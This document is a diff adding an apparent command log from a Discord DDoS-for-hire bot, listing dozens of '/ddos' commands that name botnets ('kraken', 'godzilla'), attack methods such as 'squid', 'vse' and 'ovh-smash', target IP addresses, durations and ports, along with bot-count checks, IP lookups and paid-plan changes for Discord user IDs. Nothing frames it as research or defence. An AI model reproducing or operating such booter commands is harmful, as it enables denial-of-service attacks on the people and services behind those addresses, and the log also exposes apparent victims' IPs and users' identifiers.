@@ -1,0 +1,139 @@
+/getplan <@634361766347800576>
+/getplan <@318822153677963264>
+/getbots
+/ddos std 117.27.239.28 30 80
+/ddos stdhex 117.27.239.28 60 80
+/getbots
+/ddos
+/getplan <@634361766347800576>
+/getbots
+/getbots
+/
+/getbots
+/getbots
+/checkip 174.56.218.84
+/getbots
+/getbots
+/getbots
+/ddos squid 117.27.239.28 60 80
+/get bots
+/getbots
+/ddos yourmum
+/getbots
+/getbots
+/getbots
+/get bots
+/getbots
+/getbots
+/getplan <@661098023165886474>
+/changeplan <@661098023165886474> 4
+/getplan <@661098023165886474>
+/getplan <@418537208396644352>
+/getplan <@401206698515234816>
+/changeplan <@401206698515234816>  2
+/getplan <@401206698515234816>
+/changeplan <@401206698515234816>  3
+/getplan <@401206698515234816>
+/changeplan <@!672652603880112148> 3
+/getplan <@!672652603880112148>
+/getbots
+/ping 71.235.124.208
+/methods
+/ddos godzilla squid 193.238.109.98 120 80
+/ddos godzilla vse 193.238.109.98 120 80
+/ddos godzilla vse 193.238.109.98 80 5
+/ddos godzilla VSE 193.238.109.98 80 5
+/getbots
+/methods
+/ddos godzilla std 24.118.205.222 30 80
+/ddos godzilla vse 54.227.202.179 30 9023
+/ddos godzilla cvse 52.5.22.252 9023 15 32 1024 120
+/ddos godzilla vse , 80 1
+/ddos godzilla vse 1.1.1.1 1 80
+/checkip 71.76.173.86
+/ddos kraken squid 34.204.180.3 30 9017
+/ddos kraken squid 34.204.180.3 30 9017
+/ddoss kraken squid 94.6.84.43 60 80
+/ddos kraken squid 94.6.84.43 60 80
+/
+/getbots
+/ddos kraken std 117.27.239.28 30 80
+/ddos kraken squid 103.95.221.2 30 80
+/ddos kraken squid 76.198.235.75 120 80
+/methods
+/ddos kraken squid 18.224.228.96 60 9082
+/getbots
+/ddos kraken 40.89.250.139 60 30149
+/ddos kraken squid 40.89.250.139 60 30149
+/methods
+/ddos kraken squid 51.77.103.228 60 80
+/getbots
+/getbots
+/ddos kraken 96.228.36.116 120 4500
+/ddos kraken squid 96.228.36.116 120 4500
+/methods
+/ddos kraken ovh-smash 192.99.226.9 30 443
+/plan
+/ddos kraken squid 34.204.189.140 180 9006
+/ddos kraken squid 34.229.111.208 180 9064
+/ddos kraken squid 40.88.49.137 30 30101
+/ddos kraken squid 40.88.49.137 30 30101
+/getbots
+/checkservers
+/checkservers
+/getbots godzilla
+/methods
+/checkservers
+/getbots godzilla
+/getbots godzilla
+/ddos kraken squid 73.28.68.118 300 80
+/getbots godzilla
+/checkip 219.100.37.237
+/ddos kraken squid 89.32.121.135 300 80
+/getbots
+/getbots godzilla
+/te4p
+/serverinfo
+/checkservers
+/plans
+/killme
+/getbots godzilla
+/getbots  godzilla
+/getbots godzilla
+/plan
+/checkip 69.69.69.69
+/getbots godzilla
+/getbots godzilla
+/ddos kraken squid 70.79.145.170 120 500
+/getbot godzilla
+/getbots godzilla
+/checkservers
+/ddos kraken squid 71.235.124.208 80 120
+/ddos kraken squid 71.235.124.208 80 120
+/
+/
+/getbots kraken
+/getbots kraken
+/getbots godzilla
+/getbots godzilla
+/getbots kraken
+/getbots kraken
+/
+/
+/getbots godzilla
+/getbots godzilla
+/ddos godzilla STD , 1 1
+/ddos godzilla STD , 1 1
+/ddos godzilla STD 1.1.1.1 1 1
+/ddos godzilla STD 1.1.1.1 1 1
+/ddos godzilla STD 69.69.69.69 1 1
+/ddos godzilla STD 69.69.69.69 1 1
+/ddos kraken squid 61.9.242.40 30 80
+/ddos kraken squid 61.9.242.40 120 80
+/checkip 51.79.52.92
+/ddos kraken squid 98.148.67.162 60 80
+/checkip 172.58.184.129
+/ddos kraken squid 3.12.36.156 9016 30
+/getbots kraken
+/getbots
+/getbots kraken
